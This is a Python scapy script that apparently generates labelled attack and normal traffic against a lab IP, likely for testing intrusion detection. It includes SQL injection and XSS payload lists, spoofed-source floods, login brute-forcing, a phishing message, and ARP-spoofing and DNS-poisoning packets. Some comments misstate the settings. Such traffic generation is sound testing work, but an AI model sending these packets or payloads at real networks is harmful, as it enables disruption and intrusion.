import random
import time
import os
from scapy.all import (
    IP, ICMP, UDP, TCP, ARP, DNS, DNSQR, DNSRR, Raw, send
)

TARGET_IP = "192.168.64.4"  # Change this to your target
TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # Default broadcast MAC
NORMAL_TRAFFIC_RATIO = 50  # Percentage of normal traffic (e.g., 80% normal, 20% attacks)
TEST_DURATION = 5 * 60  # 5 minutes in seconds
SLEEP_DURATION = 1  # 3 seconds between each traffic generation

# Helper function for random user agents - makes attacks more realistic
def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        # Add more if needed
    ]
    return random.choice(agents)

# Normal Traffic
def normal_traffic_ping(target_ip):
    packet = IP(dst=target_ip) / ICMP()
    send(packet, verbose=False)
    print(f"Normal ping traffic sent to {target_ip}")

def normal_traffic_http(target_ip):
    # Simulate a simple HTTP GET request
    payload = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
    packet = IP(dst=target_ip) / TCP(dport=80, flags="S") / Raw(load=payload)
    send(packet, verbose=False)
    print(f"Normal HTTP traffic sent to {target_ip}")

# Attack Traffic Functions

# 1. DDoS attack-HOIC (High Orbit Ion Cannon)
def ddos_attack_hoic(num_packets):
    """HOIC attack - simple but effective HTTP flood"""
    packets = []
    for _ in range(num_packets):
        # Random param to bypass caching
        rand_param = random.randint(1000, 9999)
        payload = f"GET /?id={rand_param} HTTP/1.1\r\nHost: example.com\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload)
        packets.append(packet)
    return packets

# 2. DDoS attacks-LOIC-HTTP
def ddos_attack_loic_http(num_packets):
    packets = []
    for _ in range(num_packets):
        payload = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload)
        packets.append(packet)
    return packets

# 3. DoS attacks-Hulk
def dos_attack_hulk(num_packets):
    packets = []
    for _ in range(num_packets):
        random_ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        payload = f"GET /index.html HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-For: {random_ip}\r\n\r\n"
        packet = IP(src=random_ip, dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload)
        packets.append(packet)
    return packets

# 4. Bot (Simulate bot-like behavior: periodic benign requests interspersed with attacks)
def bot_activity(num_packets):
    packets = []
    for _ in range(num_packets):
        port = random.randint(1, 1024)
        packet = IP(dst=TARGET_IP) / TCP(dport=port, flags="S")
        packets.append(packet)
    return packets

# 5. FTP-BruteForce
def ftp_bruteforce(num_packets, ftp_port=21):
    packets = []
    for _ in range(num_packets):
        username = f"user{random.randint(1000,9999)}"
        password = f"pass{random.randint(1000,9999)}"
        payload = f"USER {username}\r\nPASS {password}\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=ftp_port, flags="PA") / Raw(load=payload)
        packets.append(packet)
    return packets

# 6. Infiltration (Simulate data exfiltration via multiple channels)
def infiltration(num_packets):
    packets = []
    for _ in range(num_packets):
        # HTTP Exfiltration
        payload_http = "GET /data?info=secretdata HTTP/1.1\r\nHost: example.com\r\n\r\n"
        packet_http = IP(dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload_http)
        packets.append(packet_http)
        
        # DNS Exfiltration
        exfil_domain = f"data.{random.randint(1000,9999)}.example.com"
        packet_dns = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(qd=DNSQR(qname=exfil_domain), an=DNSRR(rrname=exfil_domain, rdata="1.2.3.4"))
        packets.append(packet_dns)
    return packets

# 7. DoS attacks-SlowHTTPTest (SLOW HTTP)
def dos_attack_slowhttptest(num_packets):
    packets = []
    for _ in range(num_packets):
        payload = "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=80, flags="PA") / Raw(load=payload)
        packets.append(packet)
    return packets

# 8. DoS attacks-GoldenEye
def dos_attack_goldeneye(num_packets):
    packets = []
    for _ in range(num_packets):
        method = random.choice(["GET", "POST", "PUT", "DELETE", "HEAD"])
        payload = f"{method} / HTTP/1.1\r\nHost: example.com\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload)
        packets.append(packet)
    return packets

# 9. DoS attacks-Slowloris
def dos_attack_slowloris(num_packets):
    packets = []
    for _ in range(num_packets):
        payload = "GET / HTTP/1.1\r\nHost: example.com\r\nX-a: b\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=80, flags="S") / Raw(load=payload)
        packets.append(packet)
    return packets

# 10. Brute Force -Web
def brute_force_web(num_packets, web_port=80):
    packets = []
    for _ in range(num_packets):
        username = f"user{random.randint(1000,9999)}"
        password = f"pass{random.randint(1000,9999)}"
        payload = f"POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Length: {len(username)+len(password)+6}\r\n\r\nusername={username}&password={password}"
        packet = IP(dst=TARGET_IP) / TCP(dport=web_port, flags="PA") / Raw(load=payload)
        packets.append(packet)
    return packets

# 11. Brute Force -XSS
def brute_force_xss(num_packets, web_port=80):
    packets = []
    xss_payloads = [
        "<script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>"
    ]
    for _ in range(num_packets):
        payload = random.choice(xss_payloads)
        http_payload = f"GET /search?q={payload} HTTP/1.1\r\nHost: example.com\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=web_port, flags="S") / Raw(load=http_payload)
        packets.append(packet)
    return packets

# 12. SQL Injection
def sql_injection(num_packets, web_port=80):
    packets = []
    sql_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' OR 1=1--",
        "' OR 'a'='a"
    ]
    for _ in range(num_packets):
        payload = random.choice(sql_payloads)
        http_payload = f"GET /login?username={payload}&password={payload} HTTP/1.1\r\nHost: example.com\r\n\r\n"
        packet = IP(dst=TARGET_IP) / TCP(dport=web_port, flags="S") / Raw(load=http_payload)
        packets.append(packet)
    return packets

# 13. Ransomware Activity (Already handled)
def ransomware_activity(target_ip):
    # Simulate ransomware communication over SMB (port 445)
    packet = IP(dst=target_ip) / TCP(dport=445, flags="S") / Raw(load="Ransomware: Encrypting files")
    send(packet, verbose=False)
    print(f"Ransomware activity packet sent to {target_ip}")

# 14. Email Phishing (Already handled)
def email_phishing(sender_ip, recipient_ip):
    # Simulate sending a phishing email via SMTP (port 25)
    subject = "Urgent: Reset Your Password"
    body = "Click here to reset your password: http://malicious-website.com/reset"
    payload = f"Subject: {subject}\r\n\r\n{body}"
    packet = IP(src=sender_ip, dst=recipient_ip) / TCP(dport=25, flags="PA") / Raw(load=payload)
    send(packet, verbose=False)
    print(f"Email phishing sent from {sender_ip} to {recipient_ip}")

# 15. DNS Poisoning (Already handled)
def dns_poisoning(target_ip, target_domain, fake_ip):
    # Simulate DNS response with fake IP
    packet = IP(dst=target_ip) / UDP(dport=53) / DNS(qd=DNSQR(qname=target_domain), an=DNSRR(rrname=target_domain, rdata=fake_ip))
    send(packet, verbose=False)
    print(f"DNS poisoning packet sent to {target_ip}, targeting {target_domain} with {fake_ip}")

# 16. ARP Spoofing (Already handled)
def arp_spoofing(target_ip, target_mac, spoof_ip):
    # Simulate ARP reply to poison ARP cache
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    print(f"ARP spoofing packet sent to {target_ip}, spoofing {spoof_ip}")

# 17. Brute Force Attack (SSH) (Already handled)
def brute_force_attack_ssh(target_ip, ssh_port=22):
    # Simulate SSH brute force by sending multiple login attempts
    for attempt in range(50):  # Reduced from 100 to 50 attempts
        username = f"user{random.randint(1000,9999)}"
        password = f"pass{random.randint(1000,9999)}"
        payload = f"login_attempt_{attempt}"
        packet = IP(dst=target_ip) / TCP(dport=ssh_port, flags="PA") / Raw(load=payload)
        send(packet, verbose=False)
    print(f"Brute Force attack (SSH) sent to {target_ip}:{ssh_port}")

# 18. Port Scanning (Already handled)
def port_scanning(target_ip):
    # Simulate scanning multiple ports
    for port in random.sample(range(1, 1025), 50):  # Scan 50 random ports
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
        send(packet, verbose=False)
    print(f"Port scan sent to {target_ip}")

# Mapping of attack function names to actual functions
attack_function_mapping = {
    'ddos_attack_hoic': ddos_attack_hoic,
    'ddos_attack_loic_http': ddos_attack_loic_http,
    'dos_attack_hulk': dos_attack_hulk,
    'bot_activity': bot_activity,
    'ftp_bruteforce': ftp_bruteforce,
    'infiltration': infiltration,
    'dos_attack_slowhttptest': dos_attack_slowhttptest,
    'dos_attack_goldeneye': dos_attack_goldeneye,
    'dos_attack_slowloris': dos_attack_slowloris,
    'brute_force_web': brute_force_web,
    'brute_force_xss': brute_force_xss,
    'sql_injection': sql_injection
}

# All attack function names
attack_function_names = list(attack_function_mapping.keys())

# All attack weights based on distribution
attack_weights = [1 for _ in attack_function_names]  # Assuming equal distribution

# All attack functions list
attack_functions = [attack_function_mapping[func_name] for func_name in attack_function_names]
